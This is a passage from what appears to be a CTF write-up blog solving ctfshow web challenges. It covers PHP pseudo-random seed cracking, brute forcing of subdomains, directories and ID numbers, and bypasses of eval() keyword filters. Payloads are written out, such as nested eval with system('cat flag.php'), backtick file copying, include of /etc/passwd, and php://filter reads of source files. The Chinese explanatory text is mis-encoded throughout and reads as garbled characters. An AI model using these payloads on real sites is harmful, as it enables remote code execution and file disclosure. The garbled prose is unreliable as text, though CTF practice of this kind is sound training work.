src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802173759965.png" alt="" style="zoom:67%;" /><p>æˆåŠŸçˆ†ç ´</p><p>ç„¶åè¿›è¡Œbase64è§£ç </p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174531110.png"></p><p>ctfshow{b2fcc227-8225-4964-8fd2-58a432af25ce}</p><h3 id="web22â€”å­åŸŸåçˆ†ç ´"><a href="#web22â€”å­åŸŸåçˆ†ç ´" class="headerlink" title="web22â€”å­åŸŸåçˆ†ç ´"></a>web22â€”å­åŸŸåçˆ†ç ´</h3><p>æ‰“ä¸å¼€ï¼Œä¹Ÿæ²¡æœ‰çˆ†å‡ºæ¥ï¼Œçœ‹çš„wp</p><p>ä¸è¿‡æ‰¾äº†å‡ ä¸ªå­åŸŸåçˆ†ç ´çš„å·¥å…·</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><a href="http://www.virustotal.com/">www.virustotal.com</a></p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802184909075.png" alt="image-20220802184909075"></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803201253843.png"></p><p>ç½‘ä¸Šæ‰¾çš„wpä¸ä¼šå†™ï¼Œå‘œå‘œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;åŸå­—ç¬¦ä¸²ä¸º:&#x27;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803200804230.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803200841718.png"></p><h3 id="web24â€”ä¼ªéšæœºæ•°"><a href="#web24â€”ä¼ªéšæœºæ•°" class="headerlink" title="web24â€”ä¼ªéšæœºæ•°"></a>web24â€”ä¼ªéšæœºæ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">mktime</span>());<span class="comment">//éšæœºæ•°ç”Ÿæˆ</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803230143843.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803222519649.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803225343766.png"></p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));     <span class="comment">//è®¾ç½®éšæœºæ•°ç§å­ï¼Œflagçš„md5çš„å‰8ä½ä¸ºéšæœºæ•°ç§å­</span></span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());            <span class="comment">//å˜é‡randæ˜¯r-ç”Ÿæˆçš„éšæœºæ•°</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œrçš„å€¼ä¸º0ï¼Œå°±ä¼š    0-rand=-rand    å¾—åˆ°ä¸€ä¸ªè´Ÿå€¼éšæœºæ•°</span></span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;       <span class="comment">//cookieçš„å€¼è¦ç­‰äºä¸¤æ¬¡ç”Ÿæˆçš„éšæœºæ•°çš„å€¼æ‰è¾“å‡ºflag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rand&#x3D;0 -mt_randï¼Œå¯ä»¥å¾—åˆ°ç”Ÿæˆçš„éšæœºæ•°çš„è´Ÿå€¼</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805201206296.png"></p><blockquote><p><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p></blockquote><p>mt_srand()æ˜¯ä¼ªéšæœºï¼Œé€šè¿‡åˆ†å‘ç§å­ï¼Œå¦‚æœæœ‰ç§å­çš„è¯ï¼Œç”Ÿæˆéšæœºæ•°çš„å€¼ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œç”Ÿæˆçš„å€¼ä¹Ÿå’Œphpçš„ç‰ˆæœ¬æœ‰å…³ï¼Œä¸Šé¢é‚£ä¸ªæ˜¯éšæœºæ•°ç”Ÿæˆçš„ä¸€ä¸ªå·¥å…·ï¼ŒæŠŠä»–æ”¾åœ¨Linuxä¸‹ä½¿ç”¨ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805200620791.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">makeä¸€ä¸‹ï¼Œç„¶ålsæŸ¥çœ‹ç›®å½•ï¼Œå°±æœ‰äº†php_mt_seed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç„¶å  time ./php_mt_seed  éšæœºæ•°</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/md.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805201359600.png"></p><p>è¿™ä¸ªæ˜¯ç«ç‹çš„ä¸€ä¸ªæ’ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹PHPç‰ˆæœ¬ä¿¡æ¯ï¼Œä»è¿™ä¸ªæ’ä»¶wappalyzerå¯ä»¥çŸ¥é“æ­¤PHPçš„ç‰ˆæœ¬æ˜¯7.å‡ çš„ï¼Œå°±æŒ‰ç”Ÿæˆçš„éšæœºæ•°è¿›è¡Œè¯•éªŒ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">809023198</span>);   <span class="comment">//ä¼ªéšæœºæ•°</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;    <span class="comment">//ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();     <span class="comment">//ç¬¬äºŒä¸‰æ¬¡ä¸¤è€…ä¹‹å’Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>444860526<br>2280606905</p><p>å› ä¸ºif((!$rand))   æ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œæ‰€ä»¥è¦è®©r&#x3D;ç¬¬ä¸€ä¸ªéšæœºæ•°æ‰è¡Œã€‚token&#x3D;äºŒä¸‰æ¬¡ä¹‹å’Œï¼Œbpå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805193944578.png"></p><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>æç¤ºæ˜¯çˆ†ç ´ï¼Œé‚£å°±è¿›è¡Œçˆ†ç ´</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805210959920.png" alt="" style="zoom: 80%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805210928793.png" alt="" style="zoom:80%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805211052734.png"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•</p><p>å’Œjsæœ‰å…³ï¼Œæˆ‘è¿˜æ²¡æœ‰æ¥è§¦åˆ°    å°±å…ˆä¸ç”¨é‚£ä¸ªæ–¹æ³•åšäº†</p><h3 id="web27â€“çˆ†ç ´èº«ä»½è¯"><a href="#web27â€“çˆ†ç ´èº«ä»½è¯" class="headerlink" title="web27â€“çˆ†ç ´èº«ä»½è¯"></a>web27â€“çˆ†ç ´èº«ä»½è¯</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190442401.png"></p><p>ç‚¹è¿›å»éƒ½çœ‹ä¸€ä¸‹</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190407033.png" alt="" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190521897.png"></p><p>ç”±æ­¤å¯è§ï¼Œéœ€è¦è¿›è¡Œçˆ†ç ´èº«ä»½è¯å·ï¼Œä»è€Œå¾—åˆ°å­¦å·å’Œå¯†ç ï¼ŒbpæŠ“åŒ…ï¼Œè¿™é‡Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œç«ç‹çš„bpæŠ“ä¸åˆ°è¿™ä¸ªç™»é™†çš„åŒ…ï¼Œåªèƒ½æ¢æˆè°·æ­Œ</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190803310.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190840199.png"></p><p><strong>è¿™é‡Œæˆ‘å»ºè®®æŠŠçº¿ç¨‹è°ƒä½ä¸€ç‚¹ï¼Œè¦ä¸å¯èƒ½ä¼šè¢«ctfshowå¹³å°é”™è¯¯æ£€æµ‹ï¼Œå°å·</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191005371.png"></p><p>æˆåŠŸï¼Œè¿›è¡Œé‡å‘</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191055944.png"></p><p>å¾—åˆ°ä¸€ä¸²Unicodeç¼–ç ï¼Œæ‹¿å»è§£ç </p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191131168.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191228732.png"></p><p>ç™»å½•å‡ºç°flag</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>è¿™ä¸ªé¢˜çš„æç¤ºæ˜¯ç›®å½•çˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221444176.png"></p><p>é‚£å°±ç”¨bp<a href="https://blog.csdn.net/weixin_45808483/article/details/121392526">çˆ†ç ´</a>ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221543302.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221603738.png"></p><p>çˆ†ç ´å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221039215.png"></p><h2 id="å‘½ä»¤æ‰§è¡Œ-ï¼ˆ29â€”77-118â€”124ï¼‰"><a href="#å‘½ä»¤æ‰§è¡Œ-ï¼ˆ29â€”77-118â€”124ï¼‰" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ   ï¼ˆ29â€”77  118â€”124ï¼‰"></a>å‘½ä»¤æ‰§è¡Œ   ï¼ˆ29â€”77  118â€”124ï¼‰</h2><h3 id="web29-è¿‡æ»¤flagï¼Œä¸åŒºåˆ†å¤§å°å†™"><a href="#web29-è¿‡æ»¤flagï¼Œä¸åŒºåˆ†å¤§å°å†™" class="headerlink" title="web29-è¿‡æ»¤flagï¼Œä¸åŒºåˆ†å¤§å°å†™"></a>web29-è¿‡æ»¤flagï¼Œä¸åŒºåˆ†å¤§å°å†™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807194844678.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807210933909.png"></p><p>å› ä¸ºè¿‡æ»¤flagï¼Œå°±åªèƒ½ç”¨ï¼Ÿå ä½ç¬¦ä»£æ›¿</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807210850704.png"></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807201642403.png"></p><p>è¿‡æ»¤äº†systemå¯ä»¥ç”¨å…¶ä»–ä¸œè¥¿ä»£æ›¿ï¼Œ  åˆ©ç”¨åå¼•å·å‘½ä»¤æ‰§è¡Œå°†flag.phpå¤åˆ¶æˆ1.txtç„¶åè®¿é—® </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=`cp fla?.??? <span class="number">1</span>.txt`;  <span class="comment">//cp source targetã€€å°†æ–‡ä»¶sourceå¤åˆ¶ä¸ºtarget</span></span><br></pre></td></tr></table></figure><p>â€‹       è®¿é—®1.txtå¾—åˆ°flag   </p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807201730452.png"></p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤çš„æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬çœ‹çœ‹å¯ä¸å¯ä»¥åµŒå¥—ä¸€ä¸ªeval()å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808204438707.png"></p><p>å¯ä»¥åµŒå¥—ï¼Œç„¶åå°±è¿›è¡Œæ„é€ payload     <code>?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;);</code>    æˆ‘ä»¬åœ¨è¿™é‡Œä¼ å…¥äº†ä¸€ä¸ªå‚æ•°1ï¼Œè¿™æ ·å°±è„±ç¦»äº†å¯¹cçš„æ­£åˆ™åˆ¤æ–­</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808204959355.png"></p><p>å› ä¸ºåœ¨phpä»£ç ä¸­ï¼Œcatæ‰“å¼€çš„ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œåªèƒ½æ˜¾ç¤ºåœ¨æºç éƒ¨åˆ†ã€‚æŸ¥çœ‹ç½‘é¡µæºç </p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808205150760.png" alt="" style="zoom:150%;" /><p>å¾—åˆ°flag</p><p>æˆ–è€…å†™ä¸€ä¸ªåcatï¼Œå€’ç€æ˜¾ç¤ºå‡ºæ¥   <code>?c=eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808205301750.png"></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123; <span class="comment">//è¿‡æ»¤äº†æ›´å¤šç¬¦å·ï¼Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡å¯ä»¥ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808233737167.png" alt="" style="zoom: 67%;" /><p>å› ä¸ºè¿‡æ»¤äº†æ‹¬å·å’Œåˆ†å·ï¼Œæˆ‘ä»¬å°±ç”¨ä¸éœ€è¦æ‹¬å·çš„å‡½æ•°æ¥åšï¼Œç”¨include()å‡½æ•°ï¼Œ<code>?c=include$_GET[1]%0a?&gt;&amp;1=/etc/passwd</code>   æµ‹è¯•ï¼Œæ–‡ä»¶åŒ…å«æˆåŠŸ   è¿˜å¯ä»¥æµ‹è¯•èƒ½ä¸èƒ½åŒ…å«äºŒè¿›åˆ¶æ–‡ä»¶    <code>?c=include$_GET[1]%0a?&gt;&amp;1=/bin/ls</code></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808234125543.png" alt="" style="zoom: 67%;" /><p><code>?c=include$_GET[1]%0a?&gt;&amp;1=flag.php</code>      å› ä¸ºincludeå‡½æ•°åªåŒ…å«flag.phpå˜é‡ï¼Œå¹¶ä¸èƒ½è¿›è¡Œè¾“å‡ºï¼Œå‰é¢ç¦ç”¨äº†åˆ†å·ï¼Œé€ æˆæ²¡æœ‰åˆ†å‰²ï¼Œæ— æ³•è¿›è¡Œè¾“å‡º   æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¼ªåè®®è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œé€šè¿‡æŒ‡å®šçš„ä¸€ä¸ªbase64é€šé“è¯»å–æ–‡ä»¶ï¼Œä¸é€šè¿‡base64ç¼–ç æ˜¯çœ‹ä¸åˆ°æ–‡ä»¶çš„</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808234903200.png" alt="" style="zoom: 67%;" /><p><code>?c=include$_GET[1]%0a?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>è¿›è¡Œè§£ç </p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808235058401.png" alt="" style="zoom:67%;" /><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span 